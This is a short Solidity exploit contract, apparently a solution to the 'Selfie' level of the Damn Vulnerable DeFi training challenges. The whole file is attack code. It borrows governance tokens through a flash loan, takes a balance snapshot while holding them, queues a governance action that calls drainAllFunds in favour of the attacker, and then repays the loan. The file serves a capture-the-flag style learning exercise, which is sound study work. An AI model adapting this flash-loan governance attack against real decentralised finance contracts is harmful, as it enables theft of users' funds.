pragma solidity ^0.6.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfiePool {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot governanceToken;
    address owner;

    constructor(address _pool, address _governance) public {
        owner = msg.sender;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        governanceToken = DamnValuableTokenSnapshot(
            governance.governanceToken()
        );
    }

    function run(uint256 borrowAmount) public {
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address _token, uint256 _borrowAmount) external {
        governanceToken.snapshot();
        governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", address(owner)),
            0
        );
        governanceToken.transfer(address(pool), _borrowAmount);
    }
}
